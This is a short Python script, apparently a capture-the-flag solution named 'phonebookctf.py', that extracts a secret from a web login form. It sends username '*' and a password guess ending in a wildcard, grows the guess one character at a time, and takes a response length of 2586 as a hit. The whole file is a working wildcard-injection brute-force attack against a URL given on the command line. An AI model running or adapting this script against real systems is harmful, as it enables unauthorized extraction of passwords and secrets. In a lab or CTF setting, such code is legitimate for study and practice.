import requests
import sys
print('Example: python3 phonebookctf.py http://site.to/hack\n\n\n')
def split(word):
    return [char for char in word]
url = sys.argv[1]
charlist = split('''abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~`! @#$%^&()_-+={[}]|\:;"'<,>.?/''')
flag = []
while 1: 
		for char in charlist:
			data = {
					'username':'*',
					'password':''.join(flag)+char+'*'
					}
			r = requests.post(url,data)
			if len(r.text) == 2586:
				flag.append(char)
				print(f"found! {''.join(flag)}")
				break
			if char == '/':
				flag = ''.join(flag)
				print(f'Final flag: {flag}')
				quit()
			else:
				print(char)